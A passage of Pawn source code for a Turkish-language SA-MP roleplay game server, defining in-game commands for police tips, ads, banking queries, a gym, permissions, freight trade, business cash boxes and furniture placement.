	    if(Karakter[playerid][adminlevel] >= 1 || Birlik[Karakter[playerid][birlik]][ftip] == LSPD || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	    {
            new mstring[2048];
			for(new i;i<MAX_IHBAR;i++)
			{
			    if(Ihbar[i][ihbarveren] > 0)
			    {
			    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"]\n",mstring, SQLFromName(Ihbar[i][ihbarveren]), Ihbar[i][ihbarno]);
				}
			}
			ShowPlayerDialog(playerid, 950, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"ÝHBAR", mstring, "Seç", "Ýptal");
			if(isnull(mstring)) Hata(playerid, "Herhangi bir ihbar bulunmamaktadýr.");
	    }
	}
	return 1;
}

CMD:ihbarsil(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 1 || (Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][rutbe] <= 16))
	    {
            new mstring[2048];
			for(new i;i<MAX_IHBAR;i++)
			{
			    if(Ihbar[i][ihbarveren] > 0)
			    {
			    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"]\n",mstring, SQLFromName(Ihbar[i][ihbarveren]), Ihbar[i][ihbarno]);
				}
			}
			ShowPlayerDialog(playerid, 355, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"ÝHBAR", mstring, "Seç", "Ýptal");
			if(isnull(mstring)) Hata(playerid, "Herhangi bir ihbar bulunmamaktadýr.");
	    }
	}
	return 1;
}

CMD:reklamlar(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
	    if(Karakter[playerid][adminlevel] >= 1 || Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
	    {
	        if(Karakter[playerid][rutbe] >= 10 && Birlik[Karakter[playerid][birlik]][ftip] == SANTV) return Hata(playerid, "Bu komutu kullanma yetkiniz yok.");
            new mstring[2048];
            if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV)
            {
				for(new i;i<MAX_PLAYERS;i++)
				{
				    if(reklamgonderdi[i] == 1 && reklambirlik[i] == Karakter[playerid][birlik])
				    {
				    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"]\n",mstring, OyuncuAdiniBul(i), i);
					}
				}
			}
			else
			{
			    for(new i;i<MAX_PLAYERS;i++)
				{
				    if(reklamgonderdi[i] == 1)
				    {
				    	format(mstring, sizeof(mstring), "%s"C2"%s["C1"%d"C2"]\n",mstring, OyuncuAdiniBul(i), i);
					}
				}
			}
			ShowPlayerDialog(playerid, 352, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"REKLAM", mstring, "Seç", "Ýptal");
			if(isnull(mstring)) Hata(playerid, "Herhangi bir reklam bulunmamaktadýr.");
	    }
	}
	return 1;
}

BankaParaSQL(id)
{
    foreach(new i : Player) {
		if(Karakter[i][sqlid] == id) {
			return Karakter[i][banka];
		}
	}
    new query[128], rows, fields, pbanka;
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `id` = '%d'", id);
	new Cache:cache = mysql_query(query,true);
	if (cache_get_row_count()) {
		cache_get_data(rows, fields, g_iHandle);
		pbanka = cache_get_field_content_int(0, "banka");
		cache_delete(cache);
		return pbanka;
	}
	cache_delete(cache);
	return 0;
}

BankaPara(id)
{
	return Karakter[id][banka];
}

BankaParaHesapno(_hesapno)
{
	foreach(new i : Player) {
		if(Karakter[i][hesapno] == _hesapno) {
			return Karakter[i][banka];
		}
	}
    new query[128], rows, fields, pbanka;
	format(query, sizeof(query), "SELECT * FROM `karakterler` WHERE `hesapno` = '%d'", _hesapno);
	new Cache:cache = mysql_query(query,true);
	if (cache_get_row_count()) {
		cache_get_data(rows, fields, g_iHandle);
		pbanka = cache_get_field_content_int(0, "banka");
		cache_delete(cache);
		return pbanka;
	}
	cache_delete(cache);
	return 0;
}

BankaParaDuzenSQL(id, bpara)
{
    foreach(new i : Player) {
		if(Karakter[i][sqlid] == id) {
			Karakter[i][banka] = bpara;
			return 1;
		}
	}
	new query[128];
    format(query, sizeof(query), "UPDATE `karakterler` SET `banka` = '%d' WHERE `id` ='%d'", bpara, id);
	mysql_tquery(1,query);
	return 1;
}

BankaParaDuzen(id, bpara)
{
	Karakter[id][banka] = bpara;
	KarakterKaydet(id);
	/*new query[128];
    format(query, sizeof(query), "UPDATE `karakterler` SET `banka` = '%d' WHERE `id` ='%d'", bpara, Karakter[id][sqlid]);
	mysql_tquery(1,query);*/
}

BankaParaDuzenHesapno(_hesapno, bpara)
{
    foreach(new i : Player) {
		if(Karakter[i][hesapno] == _hesapno) {
			Karakter[i][banka] = bpara;
			return 1;
		}
	}
	new query[128];
    format(query, sizeof(query), "UPDATE `karakterler` SET `banka` = '%d' WHERE `hesapno` ='%d'", bpara, _hesapno);
	mysql_tquery(1,query);
	return 1;
}

CMD:gym(playerid, params[])
{
	new nstring[10],mstring[10];
	if(isnull(params)) return Kullanim(playerid, "/gym [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: dovusstil");
    sscanf(params, "s[10]s[10]", nstring, mstring);
    if(Buysa("dovusstil",nstring))
    {
        new yakindaki = IsyeriIceridenMesafesi(35.0, playerid);
        SetPVarInt(playerid, "IsyeriBuy", yakindaki);
        if(!IsPlayerInRangeOfPoint(playerid, 5, 775.1204, -60.8511, 1000.7184) && Isyeri[yakindaki][itip] != 14) return Hata(playerid, "GYM'de deðilsiniz.");
        ShowPlayerDialog(playerid, 255, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Dövüþ Stili", "Ders\tÜcret\nBoxing\t10000$\nKungFu\t25000$\nKneeHead\t25000$\nGrabKick\t50000$\nElbow\t50000$", "Tamam", "Ýptal");
    }
    /*else if(Buysa("kas",nstring))
    {
		if(Girdi[playerid])
		{
		    if(isnull(mstring)) return Kullanim(playerid, "/kas [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: gelistir, bilgi");
		    if(Buysa("bilgi",mstring))
		    {
		        new string[128];
		        format(string, 128, ""C2"[GYM] "C1"Kas Seviyesi: %d - Kas Puaný: %d",Karakter[playerid][kasseviye],Karakter[playerid][kaspuan]);
		        SendClientMessageEx(playerid, -1, string);
		    }
		    else if(Buysa("gelistir",mstring))
		    {
		        new yakindaki = IsyeriIceridenMesafesi(30.0,playerid);
			    if(IsPlayerInRangeOfPoint(playerid, 5, 775.1204, -60.8511, 1000.7184) && Isyeri[yakindaki][itip] == 14)
				{
				    switch(Karakter[playerid][kasseviye])
				    {
				        case 0:
						{
						    if(GetPlayerCash(playerid) < 500) return Hata(playerid, "Geliþtirmek için gerekli para $500.");
						    if(Karakter[playerid][kaspuan] < 50000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 50.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 1 yaptý.");
						    Karakter[playerid][kasseviye] = 1;
						    Karakter[playerid][kaspuan] -= 50000;
						    GivePlayerCash(playerid, -500);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 300;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 1:
						{
						    if(GetPlayerCash(playerid) < 1000) return Hata(playerid, "Geliþtirmek için gerekli para $1.000.");
						    if(Karakter[playerid][kaspuan] < 100000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 100.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 2 yaptý.");
						    Karakter[playerid][kasseviye] = 2;
						    Karakter[playerid][kaspuan] -= 100000;
						    GivePlayerCash(playerid, -1000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 600;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 2:
						{
						    if(GetPlayerCash(playerid) < 5000) return Hata(playerid, "Geliþtirmek için gerekli para $5.000.");
						    if(Karakter[playerid][kaspuan] < 200000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 200.000.");
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 3 yaptý.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Karakter[playerid][kasseviye] = 3;
						    Karakter[playerid][kaspuan] -= 200000;
						    GivePlayerCash(playerid, -5000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 1200;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 3:
						{
						    if(GetPlayerCash(playerid) < 10000) return Hata(playerid, "Geliþtirmek için gerekli para $10.000.");
						    if(Karakter[playerid][kaspuan] < 400000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 400.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 4 yaptý.");
						    Karakter[playerid][kasseviye] = 4;
						    Karakter[playerid][kaspuan] -= 400000;
						    GivePlayerCash(playerid, -10000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 2400;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 4:
						{
						    if(GetPlayerCash(playerid) < 10000) return Hata(playerid, "Geliþtirmek için gerekli para $10.000.");
						    if(Karakter[playerid][kaspuan] < 800000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 800.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 5 yaptý.");
						    Karakter[playerid][kasseviye] = 5;
						    Karakter[playerid][kaspuan] -= 800000;
						    GivePlayerCash(playerid, -10000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 4800;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 5:
						{
						    if(GetPlayerCash(playerid) < 20000) return Hata(playerid, "Geliþtirmek için gerekli para $20.000.");
						    if(Karakter[playerid][kaspuan] < 1600000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 1.600.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 6 yaptý.");
						    Karakter[playerid][kasseviye] = 6;
						    Karakter[playerid][kaspuan] -= 1600000;
						    GivePlayerCash(playerid, -20000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 1600*6;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 6:
						{
						    if(GetPlayerCash(playerid) < 40000) return Hata(playerid, "Geliþtirmek için gerekli para $40.000.");
						    if(Karakter[playerid][kaspuan] < 3200000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 3.200.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 7 yaptý.");
						    Karakter[playerid][kasseviye] = 7;
						    Karakter[playerid][kaspuan] -= 3200000;
						    GivePlayerCash(playerid, -40000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 3200*6;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 7:
						{
						    if(GetPlayerCash(playerid) < 80000) return Hata(playerid, "Geliþtirmek için gerekli para $80.000.");
						    if(Karakter[playerid][kaspuan] < 6400000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 6.400.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 8 yaptý.");
						    Karakter[playerid][kasseviye] = 8;
						    Karakter[playerid][kaspuan] -= 6400000;
						    GivePlayerCash(playerid, -80000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 6400*6;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 8:
						{
						    if(GetPlayerCash(playerid) < 160000) return Hata(playerid, "Geliþtirmek için gerekli para $160.000.");
						    if(Karakter[playerid][kaspuan] < 12800000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 12.800.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 9 yaptý.");
						    Karakter[playerid][kasseviye] = 9;
						    Karakter[playerid][kaspuan] -= 12800000;
						    GivePlayerCash(playerid, -160000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 12800*6;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 9:
						{
						    if(GetPlayerCash(playerid) < 320000) return Hata(playerid, "Geliþtirmek için gerekli para $320.000.");
						    if(Karakter[playerid][kaspuan] < 25600000) return Hata(playerid, "Geliþtirmek için gerekli kas puaný 25.600.000.");
						    new sure=gettime();
					     	if(sure-Karakter[playerid][kassure] < 259200) return Hata(playerid, "3 günde bir kas geliþtirebilirsiniz.");
						    Karakter[playerid][kassure] = sure;
						    Bilgi(playerid, "Kasýnýzý baþarýyla geliþtirdiniz.");
						    Log(playerid, "Kasýný 10 yaptý.");
						    Karakter[playerid][kasseviye] = 10;
						    Karakter[playerid][kaspuan] -= 25600000;
						    GivePlayerCash(playerid, -320000);
						    for(new i = 0; i < sizeof(Isyeri); i++)
			        		{
			                	if(PlayerToPoint(20.0, playerid, Isyeri[i][cikisX], Isyeri[i][cikisY], Isyeri[i][cikisZ]))
			                	{
				                	if(GetPlayerVirtualWorld(playerid) == Isyeri[i][icikisvw])
				                	{
				                	    Isyeri[i][ikasa] += 25600*6;
				                	}
								}
							}
							KarakterKaydet(playerid);
						}
						case 10:
						{
						    Hata(playerid, "Ulaþabileceðiniz en yüksek kas seviyesine ulaþmýþsýnýz.");
						    return 1;
						}
				    }
				}
				else
				{
				    Hata(playerid, "Kas geliþtirmek için GYM'de olmanýz gerekmektedir.");
				    return 1;
				}
			}
		}
	}*/
	return 1;
}
CMD:mikrofonver(playerid, params[])
{
	if((IsPlayerConnected(playerid) && Karakter[playerid][adminlevel] >= 1 && AKontrol(playerid)) || (Girdi[playerid] && Birlik[Karakter[playerid][birlik]][ftip] == SANTV))
	{
	    new pid;
        if(sscanf(params, "u", pid)) return Kullanim(playerid, "/mikrofonver [oyuncuID]");
        if(!IsPlayerConnected(pid)) return Hata(playerid, "Oyuncu sunucuya baðlý deðil.");
        if(Birlik[Karakter[playerid][birlik]][ftip] == SANTV && !IsPlayerNearPlayer(playerid, pid, 5)) return Hata(playerid, "Oyuncuya yakýn deðilsiniz.");
        if(mik[pid] == 0)
        {
			mik[pid] = 1;
			if(Karakter[playerid][adminlevel] > 1)
			{
		        Bilgi(playerid, "Oyuncuya mikrofon yetkisi verdiniz.");
		        Bilgi(pid, "Yönetici size mikrofon yetkisi verdi.");
			}
			else
			{
			    Bilgi(playerid, "Oyuncuya mikrofon verdiniz.");
			    Bilgi(pid, "SANTV görevlisi size mikrofon verdi.");
			}
		}
		else if(mik[pid] == 1)
        {
			mik[pid] = 0;
			if(Karakter[playerid][adminlevel] > 1)
			{
		        Bilgi(playerid, "Oyuncudan mikrofon yetkisi aldýnýz.");
		        Bilgi(pid, "Yönetici sizden mikrofon yetkinizi aldý.");
			}
			else
			{
			    Bilgi(playerid, "Oyuncudan mikrofonu aldýnýz.");
			    Bilgi(pid, "SANTV görevlisi sizden mikrofonu aldý.");
			}
		}
	}
	return 1;
}
/*CMD:siren(playerid, params[])
{
	if(Birlik[Karakter[playerid][birlik]][ftip] == LSPA || (Birlik[Karakter[playerid][birlik]][ftip] == LSPD && Karakter[playerid][isbasi]) || Birlik[Karakter[playerid][birlik]][ftip] == FBI)
	{
	    if (GetPlayerState(playerid) != PLAYER_STATE_DRIVER)
	    {
	    	return 1;
	    }
	    if(!Karakter[playerid][isbasi]) return Hata(playerid, "Ýþbaþý deðilsiniz.");

		if(IsPlayerInAnyVehicle(playerid))
		{
			for(new x=0; x<MAX_VEHICLES; x++)
			{
	  			if(SirenUygun(Arac[x][amodel]))
				{
					if(Arac[x][SirenD] == 0)
					{
						AracaSiren(x);
						Arac[x][SirenD] = 1;
						SendClientMessage(playerid,-1,"{00DD00}[!]: {FFFFFF}Objeyi görmek için aracý hareket ettirin");
					}
					else
					{
						if(IsValidDynamicObject(Arac[x][SirenObje]))
						{
						   	DestroyDynamicObject(Arac[x][SirenObje]);
						}
						Arac[x][SirenD] = 0;
						Bilgi(playerid,"Sireni aracýn içerisine aldýnýz");
					}
				}
				else
				{
				    Hata(playerid,"Bu araç için uygun siren pozisyonlarý bulunamadý, ekletmek için yönetime ulaþýn");
				}
				break;
			}
		}
		else
		{
		    Hata(playerid,"Araç içerisinde olmalýsýnýz");
		}
	}
	return 1;
}*/
CMD:ruhsat(playerid, params[])
{
	if(IsPlayerInRangeOfPoint(playerid, 5, -1265.0060,2427.4622,3501.4866))
	{
 		ShowPlayerDialog(playerid, 669, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Polis Departmaný Ýþlem", ""NOKTA" Silah Bulundurma Ruhsatý\t 75000"DOLAR"$"C1"\n"NOKTA" Silah Taþýma Ruhsatý\t 75000"DOLAR"$"C1"", "Seç", "Ýptal");
	}
	return 1;
}
CMD:ak9ver(playerid, params[])
{
	if(IsPlayerConnected(playerid) && Karakter[playerid][adminlevel] >= 6 && AKontrol(playerid))
	{
	    new pid;
        if(sscanf(params, "u", pid)) return Kullanim(playerid, "/ak9ver (playerid)");
        if(!IsPlayerConnected(pid)) return Hata(playerid, "Oyuncu sunucuya baðlý deðil.");
        if(k9izin[pid] == 0)
        {
			k9izin[pid] = 1;
		   	Bilgi(playerid, "Oyuncuya K9 yetkisi verdiniz.");
		   	Bilgi(pid, "Yönetici size K9 yetkisi verdi.");
		}
		else if(k9izin[pid] == 1)
        {
			k9izin[pid] = 0;
	  		Bilgi(playerid, "Oyuncudan K9 yetkisi aldýnýz.");
	  		Bilgi(pid, "Yönetici sizden K9 yetkinizi aldý.");
		}
	}
	return 1;
}
stock SetPlayerVirtualWorldEx(id, wid)
{
    return SetPlayerVirtualWorld(id,wid);
}
stock SetPlayerInteriorEx(id, intid)
{
    return SetPlayerInterior(id,intid);
}
stock PutPlayerInVehicleEx(id, vid, sid)
{
    return PutPlayerInVehicle(id,vid,sid);
}
stock SetVehiclePosEx(id, Float:vx, Float:vy,Float:vz)
{
    return SetVehiclePos(id,vx,vy,vz);
}
CMD:malal(playerid, params[])
{
    new vid = GetPlayerVehicleID(playerid);
    new string[128];
    if(IsPlayerInAnyVehicle(playerid))
    {
   		if(Arac[vid][abirliktip] == NAKLIYE)
   		{
   		    if(Birlik[Karakter[playerid][birlik]][ftip] != NAKLIYE) return Hata(playerid, "Nakliye þirketinde çalýþmýyorsunuz.");
  	  		if(IsPlayerInRangeOfPoint(playerid, 15.0, 135.5308,-279.9747,1.5781)) // içecek
	        {
	   	    	format(string, sizeof(string), "Ürün\tFiyat\nBira\t$%d\nÞarap\t$%d\nViski\t$%d\nSprunk\t$%d", Veriler[ickifiyat], Veriler[ickifiyat], Veriler[ickifiyat], Veriler[ickifiyat]);
	        	ShowPlayerDialog(playerid, 3021, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", string, "Satýn Al", "Kapat");
			}
			else if(IsPlayerInRangeOfPoint(playerid, 15.0, -576.0687,-504.8411,25.5234))
			{
 	 			format(string, sizeof(string), "Ürün\tFiyat\nDondurulmuþ Yiyecekler\t$%d\nSýcak Yiyecekler\t$%d\nDünya Mutfaðý\t$%d", Veriler[yiyecekfiyat], Veriler[yiyecekfiyat], Veriler[yiyecekfiyat]);
				ShowPlayerDialog(playerid, 3023, DIALOG_STYLE_TABLIST_HEADERS, ""C7"EIGHTBORN - "C8"Nakliye Sistemi", string, "Satýn Al", "Kapat");
			}
			else
			{
			    Hata(playerid, "Ýçecek/yiyecek/benzin/alkol fabrikasýnda deðilsiniz.");
			}
		}
		else
		{
		    Hata(playerid, "Bu araç ile mal alamazsýnýz.");
		}
	}
	else
	{
		Hata(playerid, "Herhangi bir araç içerisinde deðilsiniz.");
  	}
	return 1;
}
CMD:isyerikasa(playerid, params[]) return cmd_ikasa(playerid, params);
CMD:ikasa(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
		new mesafe = IsyeriMesafesi(2.0, playerid);
		if(mesafe == 0){Hata(playerid, "Bu komutu kullanabilmek için iþyerinizin yakýnýnda olmalýsýnýz."); return 1; }
	    if(Isyeri[mesafe][isahip] != Karakter[playerid][sqlid] && Isyeri[mesafe][kiralayan] != Karakter[playerid][sqlid])
	    {
		    Hata(playerid, "Bu iþyeri size ait deðil.");
	        return 1;
		}
		new mstring[12], nstring[64], mik1=0;
        if(isnull(params)) return Kullanim(playerid, "/ikasa [fonksiyon] [deðer]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: cek, yatir, bilgi");
        sscanf(params, "s[12]d", mstring, mik1);
		if(strcmp(mstring, "cek", true) == 0)
        {
            if(mik1 == 0) return Kullanim(playerid, "/ikasa cek [deðer]");
            if(mik1 < 0 || mik1 > Isyeri[mesafe][ikasa]) return Hata(playerid, "Hatalý miktar.");
			format(nstring, sizeof(nstring), "Ýþyerinizden $%d çektiniz.[KASA : %d]",mik1,Isyeri[mesafe][ikasa]-mik1);
			Isyeri[mesafe][ikasa] -= mik1;
			GivePlayerCash(playerid, mik1);
			Bilgi(playerid, nstring);
			IsyeriKaydet(mesafe);
        }
        else if(strcmp(mstring, "yatir", true) == 0)
        {
            if(mik1 == 0) return Kullanim(playerid, "/ikasa yatir [deðer]");
        	if(mik1 < 0 || GetPlayerCash(playerid) < mik1) return Hata(playerid, "Hatalý miktar.");
			format(nstring, sizeof(nstring), "Ýþyerinize $%d yatýrdýnýz.[KASA : %d]",mik1,Isyeri[mesafe][ikasa]+mik1);
			Isyeri[mesafe][ikasa] += mik1;
			GivePlayerCash(playerid, -mik1);
			Bilgi(playerid, nstring);
			IsyeriKaydet(mesafe);
        }
        else if(Buysa("bilgi",mstring))
        {
            format(nstring, sizeof(nstring), "Ýþ yeri kasanýzda $%d bulunmaktadýr.",Isyeri[mesafe][ikasa]);
            Bilgi(playerid, nstring);
            IsyeriKaydet(mesafe);
        }
	}
	return 1;
}

CMD:mobilya(playerid, params[])
{
	if(IsPlayerConnected(playerid))
	{
        new mesafe = EvIceridenMesafesi(playerid);
        if(mesafe == 0) return Hata(playerid, "Evin içerisinde deðilsiniz.");
 		if(Ev[mesafe][esahip] != Karakter[playerid][sqlid] && Ev[mesafe][kiralayan] != Karakter[playerid][sqlid] && !EvAnahtarKontrol(playerid, mesafe))
		{
		    Hata(playerid,"Evin sahibi veya kiracý deðilsiniz.");
		    return 1;
  		}
  		if(isnull(params)) return Kullanim(playerid, "/mobilya [fonksiyon]"),SendClientMessage(playerid, -1, "Geçerli fonksiyonlar: kur, sec, duzenle, id");
        new mstring[512],id=-1;
		sscanf(params, "s[512]d", mstring, id);
  		if(Buysa("kur",mstring))
  		{
  		    strdel(mstring, 0, strlen(mstring));
  			for(new i;i<MAX_MOBILYA;i++)
  			{
  			    if(Mobilya[i][mint] == Ev[mesafe][ecikisint] && Mobilya[i][mvw] == mesafe && Mobilya[i][mx] == 0 && Mobilya[i][my] == 0 && Mobilya[i][mz] == 0)
				{
				    format(mstring, sizeof(mstring), "%ssqlID:%d\t Modelid:%d\n",mstring,Mobilya[i][mid],Mobilya[i][mmodel]);
				}
		  	}
		  	ShowPlayerDialog(playerid, 305, DIALOG_STYLE_LIST, ""C7"EIGHTBORN - "C8"Mobilya", mstring, "Kur", "Ýptal");
		}
		else if(Buysa("sec",mstring))
		{
		    switch(mobilyaci2[playerid])
			{
			    case 0:
			    {
			  		mobilyaci2[playerid] = 1;
			  		SelectObject(playerid);
			  		Ipucu(playerid, "Düzenlemek veya kaldýrmak istediðiniz mobilyayý seçin.");
				}
				case 1:
				{
				    mobilyaci2[playerid] = 0;
			  		CancelEdit(playerid);
				}
			}
		}
		else if(Buysa("id",mstring))
		{
		    if(mobilyaci5[playerid] == 0)
			{
			    mobilyaci5[playerid] = 1;
			    for(new i;i<MAX_MOBILYA;i++)
			    {
			        if(Mobilya[i][mx] != 0 && Mobilya[i][mz] != 0 && Mobilya[i][my] != 0 && Mobilya[i][mmodel] != 0 && Mobilya[i][mvw] == GetPlayerVirtualWorld(playerid) && Mobilya[i][mint] == GetPlayerInterior(playerid))
			        {
			            format(mstring, sizeof(mstring), "{FFFFFF}Mobilya[{fb5a02}%d{FFFFFF}]",i);
			        	Mobilya[i][mlabel] = CreatePlayer3DTextLabel(playerid,mstring,0x008080FF,Mobilya[i][mx],Mobilya[i][my],Mobilya[i][mz],3.0);
					}
			    }
			    Ipucu(playerid, "Mobilya idlerini görüyorsunuz.");
			}
			else if(mobilyaci5[playerid] == 1)
			{
			    mobilyaci5[playerid] = 0;
			    for(new i;i<MAX_MOBILYA;i++)
			    {
			        if(Mobilya[i][mmodel] != 0  && Mobilya[i][mvw] == GetPlayerVirtualWorld(playerid) && Mobilya[i][mint] == GetPlayerInterior(playerid))
			        {
			        	DeletePlayer3DTextLabel(playerid, Mobilya[i][mlabel]);
					}
			    }
			    Ipucu(playerid, "Mobilya idlerini görmüyorsunuz.");
			}
		}
		else if(Buysa("duzenle",mstring))
		{
		    if(id == -1) return Kullanim(playerid, "/mobilya duzenle [mobilyaID]");
	  		if(IsValidDynamicObject(Mobilya[id][mobje]) && Mobilya[id][mvw] == GetPlayerVirtualWorld(playerid) && Mobilya[id][mint] == GetPlayerInterior(playerid) && Mobilya[id][mmodel] != 0)
	  		{
	  			mobilyaci[playerid] = Mobilya[id][mobje];
		  		mobilyaci3[playerid] = id;
		  		format(mstring, sizeof(mstring), "MODELID\t{B3B3B3}%d\nTEXTURE\t{B3B3B3}%d - %d\nDüzenle\nKaldýr", Mobilya[id][mmodel], Mobilya[id][mtexture][0], Mobilya[id][mtexture][1]);
